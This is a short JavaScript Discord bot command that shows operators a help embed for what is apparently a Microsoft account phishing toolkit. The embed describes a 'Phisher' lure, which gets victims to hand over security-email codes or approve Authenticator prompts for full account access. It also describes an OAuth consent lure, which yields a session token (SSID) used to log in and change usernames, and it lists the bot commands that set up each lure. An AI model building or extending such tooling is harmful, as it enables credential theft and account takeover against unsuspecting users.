const { EmbedBuilder } = require('discord.js');

module.exports = {
    name: "seeverification",
    callback: async (client, interaction) => {
        const embed = new EmbedBuilder()
            .addFields([
                {
                    name: 'Different verification methods',
                    value:
                        `**1. Phisher**\n` +
                        `* Asks for a code from the security email or requests the user to accept an authentication request on the Microsoft Authenticator app.\n` +
                        `* Gives full access to the account.\n` +
                        `* Create: \`/embed option: Verification\`\n` +
                        `* Verification type: in \`/bots > Phisher\` select to ask for either Username and Email together or Username first and then Email.\n\n` +
                        `**2. OAuth**\n` +
                        `* Asks the user to authorize an OAuth app with their Microsoft account consents.\n` +
                        `* Provides a 24-hour lasting token called SSID, which can be used to log in & change the username.\n` +
                        `* Set your OAuth link in \`/bots > Phisher\`\n` +
                        `* Create: \`/embed option: oAuth\``
                }
            ])
            .setColor(0xADD8E6);

        await interaction.reply({ embeds: [embed], ephemeral: true });
    }
};
